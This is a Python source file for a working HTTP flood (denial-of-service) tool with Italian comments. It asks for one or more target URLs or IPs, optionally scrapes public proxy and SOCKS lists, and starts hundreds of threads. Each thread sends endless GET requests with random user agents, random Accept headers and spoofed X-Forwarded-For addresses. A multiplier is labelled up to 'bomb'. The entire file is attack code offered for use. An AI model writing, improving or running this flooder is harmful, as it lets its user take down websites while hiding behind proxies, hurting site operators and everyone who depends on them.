import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys


print('''
no te creas hacker por utilizar esta vaina 
	''') # la grafica ci sta



useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
			"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
			"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
			"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
			"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
			"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
			"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
			"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
			"Bloglines/3.1 (http://www.bloglines.com)",
			"CSSCheck/1.2.2",
			"Dillo/2.0",
			"DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"DoCoMo/2.0 SH901iC(c100;TB;W24H12)",
			"Download Demon/3.5.0.11",
			"ELinks/0.12~pre5-4",
			"ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
			"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)",
			"EmailWolf 1.00",
			"everyfeed-spider/2.0 (http://www.everyfeed.com)",
			"facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
			"FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
			"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
			"Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
			"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
			"Googlebot-Image/1.0",
			"Googlebot-News",
			"Googlebot-Video/1.0",
			"Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)",
			"grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
			"Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
			"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile 			Safari/525.20.1",
			"HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0",
			"HTMLParser/1.6",
			"iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)",
			"iTunes/9.0.2 (Windows; N)",
			"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
			"Java/1.6.0_13",
			"Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
			"Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)",
			"LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
			"LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"libwww-perl/5.820",
			"Links/0.9.1 (Linux 2.4.24; i386;)",
			"Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)",
			"Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
			"Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
			"Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
			]


def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	global url
	global url2
	global urlport
	global choice1
	global ips

	choice1 = input("\nDo you want one target [0] or more[1] > ")

	if choice1 == "1":
		ip_file = input("Insert txt file of ips > ")
		ips = open(ip_file).readlines()



	else:
		url = input("\nInsert URL/IP: ").strip()

		if url == "":
			print ("Please enter the url.")
			starturl()

		try:
			if url[0]+url[1]+url[2]+url[3] == "www.":
				url = "http://" + url
			elif url[0]+url[1]+url[2]+url[3] == "http":
				pass
			else:
				url = "http://" + url
		except:
			print("You mistyped, try again.")
			starturl()

		try:
			url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
		except:
			url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

		try:
			urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
		except:
			urlport = "80"

	proxymode()


def proxymode():
	global choice2
	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()

def choiceproxysocks():
	global choice3
	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("You mistyped, try again.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
	if choice4 == "y":
		urlproxy = "http://free-proxy-list.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def choicedownsocks():
	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
	if choice4 == "y":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write("")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except: # se succede qualche casino
		print ("\nERROR!\n")
	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()

def proxylist():
	global proxies
	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	proxies = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (800): "))
	except ValueError:
		threads = 800
		print ("800 threads selected.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
	except ValueError:
		print("You mistyped, try again.\n")
		multiplication()
	begin()

def begin():
	choice6 = input("Press 'Enter' to start attack: ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": #lool
		loop()
	elif choice6 == "enter": #loool
		loop()
	else:
		exit(0)

def loop():
	global threads
	global acceptall
	global connection
	global go
	global x
	
	acceptall = [
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
	"Accept-Encoding: gzip, deflate\r\n", 
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	] # header accept a caso per far sembrare le richieste più legittime
	connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
	x = 0 # thanks therunixx, my friend
	go = threading.Event()
	if choice2 == "y": # se abbiamo scelto la modalita' proxying
		if choice3 == "0": # e abbiamo scelto gli HTTP proxy
			for x in range(threads):
				RequestProxyHTTP(x+1).start() # starta la classe apposita
				print ("Thread " + str(x) + " ready!")
			go.set() # questo fa avviare i threads appena sono tutti pronti
		else: # se abbiamo scelto i socks
			for x in range(threads):
				RequestSocksHTTP(x+1).start() # starta la classe apposita
				print ("Thread " + str(x) + " ready!")
			go.set() # questo fa avviare i threads appena sono tutti pronti
	else: # altrimenti manda richieste normali non proxate.
		for x in range(threads):
			RequestDefaultHTTP(x+1).start() # starta la classe apposita
			print ("Thread " + str(x) + " ready!")
		go.set() # questo fa avviare i threads appena sono tutti pronti


class RequestProxyHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
		accept = random.choice(acceptall) # scelta header accept a caso
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che i threads siano pronti
		while True: # ciclo infinito
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except:
				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia

class RequestSocksHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta proxy a caso
		accept = random.choice(acceptall) # scelta accept a caso
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
				s = socks.socksocket() # creazione socket con pysocks
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
				s.close() # chiude socket
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
					s = socks.socksocket() # creazione nuovo socket
					s.connect((str(url2), int(urlport))) # connessione
					s.send (str.encode(request)) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
						s.close()
				except:
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.

class RequestDefaultHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
		accept = random.choice(acceptall) # accept a caso
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		go.wait() # aspetta che i threads siano pronti
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent! @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se qualcosa va storto
				s.close() # chiude socket e ricomincia


if __name__ == '__main__':
	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.